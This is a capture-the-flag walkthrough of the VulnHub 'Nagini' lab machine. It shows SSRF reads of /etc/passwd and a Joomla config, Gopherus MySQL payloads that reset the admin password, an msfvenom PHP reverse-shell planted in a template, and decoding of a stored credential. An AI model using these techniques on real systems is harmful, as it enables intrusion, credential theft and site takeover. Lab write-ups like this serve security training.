# Walkthrough VULNHUB --> HARRY POTTER: NAGINI

First step is to scan our Netwok to find the machine IP, in my case the host has ip 192.168.1.172.

We use nmap to scan the target machine with the command:

```bash
nmap -sC -sV -p- 192.168.1.174
```

![Alt text](./img/nmap.PNG?raw=true "NMAP Results")

I navigate to the web page to see what it is and to check if we find any visible vulnerability on that page.

![Alt text](./img/web_page_port80.PNG?raw=true "Port 80")

We run a scan on the port 80 with gobuster to search for interesting things.

```bash
gobuster dir --url http://192.168.1.174 -x .php,.js,.txt,.html --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
```

![Alt text](./img/gobuster.PNG?raw=true "GOBUSTER SCAN")

We start browsing the /note.txt and we find as follow:

```
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
```

**WE NEED HTTP3!!!!!**

We also need to add **quic.nagini.hogwarts** in our **/etc/hosts**.

After spending some time on internet trying to figure out how to use this http3, I found this guide to enable **curl** with http3 support.

[https://github.com/curl/curl/blob/master/docs/HTTP3.md](https://github.com/curl/curl/blob/master/docs/HTTP3.md)

**NOW I built a new curl with http3 support**

Using curl we do a GET request on https://quic.nagini.hogwarts:

```bash
./curl --http3 https://quic.nagini.hogwarts
```

![Alt text](./img/http3.PNG?raw=true "CURL HTTP3")

We retrieve 2 important informations:
1 /internalResourceFeTcher.php
2 .bak

Let's see what is /internalResourceFeTcher.php

![Alt text](./img/internalFetcher.PNG?raw=true "/internalResourceFeTcher.php")

Let's try to search for a and see the result.

![Alt text](./img/a.PNG?raw=true "/internalResourceFeTcher.php search")

Noted something?

The search append in the url **?url=a**, so let's try to see if there is any **SSRF** vulnerability using in the url **file:///etc/passwd**

```bash
curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///etc/passwd
```

![Alt text](./img/passwd.PNG?raw=true "/etc/passwd")

As you might have noticed, in the webserver there is Joomla, so now let's see if we can access to Jumla configuration file.

```bash
curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///var/www/html/joomla/configuration.php
```

![Alt text](./img/config.PNG?raw=true "/var/www/html/joomla/configuration.php")

Searching on Google "SSRF exploit mysql",
![Alt text](./img/google.PNG?raw=true "Google search")
I found my answers in [Gopherus](https://github.com/tarunkant/Gopherus)

First step with Gopherus is to create a payload that give us the table list so using the command **use joomla; show tables;**.
![Alt text](./img/showTables.PNG?raw=true "SHOW Tables payload")

Appending the payload to curl, does not work.

So, I try to add the payload on the url in the browser. It seems that doesn't work either.

**At the end I pasted the payload in the search and submitted by clicking on Fetch**

If you don't see anything refresh the page, it can take few refresh before something is displayed.

![Alt text](./img/1try.PNG?raw=true "List Tables")

As you can see we can display the tables and we can see that there is a joomla_users table, which we are going to see next by creating another payload with Gopherus as done previously.

The command we are going to run is:

```sql
USE joomla; SELECT * FROM joomla_users
```

We could list the users and find the user **site_admin** and it's password.
![Alt text](./img/joomla_users.PNG?raw=true "Joomla Users")

After trying a lot of MD5 decoder, I decided to create another payload to change the password using **password1234**, so it's hased is **bdc87b9c894da5168059e00ebffb9077**.

Our command will be then:

```sql
use joomla; update joomla_users set password = 'bdc87b9c894da5168059e00ebffb9077' where username='site_admin';select * from joomla_users;
```

![Alt text](./img/newP.PNG?raw=true "New Password")

We are now able to login in the Joomla's administration portal, by going to http://192.168.1.174/joomla/administrator

![Alt text](./img/joomlaAdminLogin.PNG?raw=true "Admin Login")

We can insert **super_admin**/**password1234** and we're in!

![Alt text](./img/adminPage.PNG?raw=true "Admin Page")

We can now modify a template adding a payload that we are going to generate with **msfvenom**

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o test.php
```

![Alt text](./img/msfVenom.PNG?raw=true "MSFVENOM")

Let's start **msfconsole** using **explit/multi/handler** and setting up the payload as **php/meterpreter/reverse_tcp**

![Alt text](./img/msf.PNG?raw=true "MSFCONSOLE")

Next step will be to copy the content of test.php into our joomla template, so let's see what is inside our payload:

```bash
cat test.php
```

![Alt text](./img/payload.PNG?raw=true "Payload")

Now we move into the Admin console and we navigate till the Template editor.

![Alt text](./img/editTemplate.PNG?raw=true "Edit Template")

We are going now to paste our payload in line 9 and we save.

![Alt text](./img/editedTemplate.PNG?raw=true "Edited Template")

Once saved, just go to [http://quic.nagini.hogwarts/joomla/infex.php](http://quic.nagini.hogwarts/joomla/infex.php) and **BOOOOOOOOOM**.... We got a reverse shell in our meterpreter.

![Alt text](./img/reverse.PNG?raw=true "REVERSE SHELL")

At this point we can open the shell and start exploring:

```bash
meterpreter > shell
Process 3482 created.
Channel 0 created.
export TERM=xterm
python3  -c "import pty;pty.spawn('/bin/bash')"

```

I always like to see how many users there are in the system, so I navigate in the home and noted 2 users, **snape** and **hermoine**.

I went first on the snape home directory and find the .creds.txt file which contains some base64 information so i decoded it and find something I'll try next as password. Let's see the steps:

```bash
www-data@Nagini:/home/snape$ cd /home
cd /home
www-data@Nagini:/home$ ls
ls
hermoine  snape
www-data@Nagini:/home$ cd sna
cd snape/
www-data@Nagini:/home/snape$ ls -l
ls -l
total 0
www-data@Nagini:/home/snape$ ls -la
ls -la
total 32
drwxr-xr-x 4 snape snape 4096 Apr  4 17:09 .
drwxr-xr-x 4 root  root  4096 Apr  4 00:22 ..
-rw-r--r-- 1 snape snape  220 Apr  3 23:57 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3 23:57 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4 10:35 .creds.txt
drwx------ 3 snape snape 4096 Apr  4 16:38 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3 23:57 .profile
drwx------ 2 snape snape 4096 Apr  4 10:42 .ssh
www-data@Nagini:/home/snape$ cat .cre
cat .creds.txt
TG92ZUBsaWxseQ==
www-data@Nagini:/home/snape$ cat .creds.txt |base64 -d
cat .creds.txt |base64 -d
Love@lilly
```

We can now try to login as snape via ssh:

```bash
ssh snape@quic.nagini.hogwarts
```

![Alt text](./img/sanpe.PNG?raw=true "SNAPE")

I tried to check if we have sudo permission, but no, then I checked the system permission to run some code and found something interesting.

In /home/hermoine/bin there is a su_cp.

```bash
snape@Nagini:~$ sudo -l
-bash: sudo: command not found
snape@Nagini:~$ find / -perm -u=s 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/home/hermoine/bin/su_cp

```

The **su_cp** command seems to copy a file from SOURCE to DEST.

Navigating in /home/hermoine, I noted that there is .ssh folder which is empty.

So i thought to upload a id_rsa using a webserver to snape home file and then using the su_cp to import it into /home/hermoine/.ssh

Before doing it, I forgot to catch the 1st flag :D

```bash
snape@Nagini:~$ find / -name horcrux* 2>/dev/null
/var/www/html/horcrux1.txt
/home/hermoine/horcrux2.txt
snape@Nagini:~$ cat /var/www/html/horcrux1.txt
horcrux_{MzXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX9O}

```

**Let's move on....**

Let's open a new terminal in our Hacking machine and go to the .ssh folder

```bash
cd ~/.ssh
```

Start a web server

```bash
python3 -m http.server 80
```

![Alt text](./img/http.PNG?raw=true "LOCAL WEB SERVER")
